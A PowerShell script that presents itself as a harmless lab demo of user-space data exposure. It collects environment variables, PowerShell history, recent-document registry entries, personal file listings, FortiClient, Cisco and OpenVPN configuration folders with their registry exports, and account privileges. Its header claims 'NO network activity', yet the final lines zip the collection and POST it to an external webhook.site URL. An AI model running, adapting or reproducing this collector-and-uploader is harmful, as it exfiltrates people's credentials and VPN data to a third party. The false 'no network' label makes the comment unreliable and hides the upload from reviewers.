<#
User Space Data Collection Script

Purpose:
Demonstrate what sensitive information is accessible
from a standard user account and how it appears in Process Monitor.

NO network activity
NO decryption
NO persistence
#>

# =============================
# Output directory
# =============================
$Out = "C:\Lab\Output"
New-Item -ItemType Directory -Path $Out -Force | Out-Null

# =============================
# Environment Variables
# =============================
Get-ChildItem Env: |
Out-File "$Out\environment_variables.txt"

# =============================
# PowerShell Command History
# =============================
$psHistory = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path $psHistory) {
    Copy-Item $psHistory "$Out\powershell_history.txt" -Force
}

# =============================
# Startup Folder
# =============================
$startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
if (Test-Path $startup) {
    Get-ChildItem $startup |
    Select Name, FullName |
    Out-File "$Out\startup_programs.txt"
}

# =============================
# Personal Files (names only)
# =============================
$personalFolders = @("Documents", "Desktop", "Downloads")

foreach ($folder in $personalFolders) {
    $path = Join-Path $env:USERPROFILE $folder
    if (Test-Path $path) {
        Get-ChildItem $path -File |
        Select Name, Length |
        Out-File "$Out\$folder`_files.txt"
    }
}

# =============================
# activity
# =============================

$OutFile = "$Out\activity_log.txt"

"==== RECENT DOCUMENTS (Most Recent First) ====" | Out-File $OutFile -Append

$recentKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs'
$props     = Get-ItemProperty $recentKey
$mru       = $props.MRUListEx

# Decode MRUListEx (DWORD array)
$ids = for ($i = 0; $i -lt $mru.Length; $i += 4) {
    $id = [BitConverter]::ToInt32($mru, $i)
    if ($id -eq -1) { break }
    $id
}

foreach ($id in $ids) {
    $name = "$id"
    if ($props.PSObject.Properties.Name -contains $name) {
        try {
            $raw = $props.$name
            $text = [Text.Encoding]::Unicode.GetString($raw) -replace "`0.*"
            if ($text) {
                $text | Out-File $OutFile -Append
            }
        } catch {}
    }
}

# =============================
# VPN Configuration Files
# =============================

$vpnOut = "$Out\VPN"
New-Item -ItemType Directory -Path $vpnOut -Force | Out-Null

$vpnPaths = @(
    "$env:APPDATA\FortiClient",
    "$env:LOCALAPPDATA\FortiClient",
    "$env:APPDATA\Cisco",
    "$env:LOCALAPPDATA\Cisco",
    "$env:USERPROFILE\OpenVPN\config"
)

foreach ($v in $vpnPaths) {
    if (Test-Path $v) {
        $name = ($v -replace "[:\\]", "_")
        Copy-Item $v "$vpnOut\$name" -Recurse -Force -ErrorAction SilentlyContinue
    }
}

# VPN-related registry keys (user space only)
reg export HKCU\Software\Fortinet "$vpnOut\fortinet_registry.reg" /y 2>$null
reg export HKCU\Software\Cisco "$vpnOut\cisco_registry.reg" /y 2>$null

# =============================
# Getting User Permissions
# =============================
(Get-Acl "$env:USERPROFILE").Access | Out-File "$Out\privileges.txt"
(whoami /priv) | Out-File "$Out\privileges.txt" -Append
$id = [System.Security.Principal.WindowsIdentity]::GetCurrent();
"==== SID User Account ====" | Out-File "$Out\privileges.txt" -Append
("$($id.Name) -> $($id.User.Value)") | Out-File "$Out\privileges.txt" -Append


$documentsPath = Join-Path $env:USERPROFILE "Documents"
$zipPath = Join-Path $documentsPath "lab.zip"

Compress-Archive -Path "C:\lab" -DestinationPath $zipPath -Force

$uri = "https://webhook.site/fc977ec8-8639-41de-9014-d12fcc2e347b/upload"

Invoke-WebRequest `
    -Uri $uri `
    -Method Post `
    -InFile $zipPath `
    -ContentType "application/zip" `
    -UseBasicParsing `
    | Out-Null
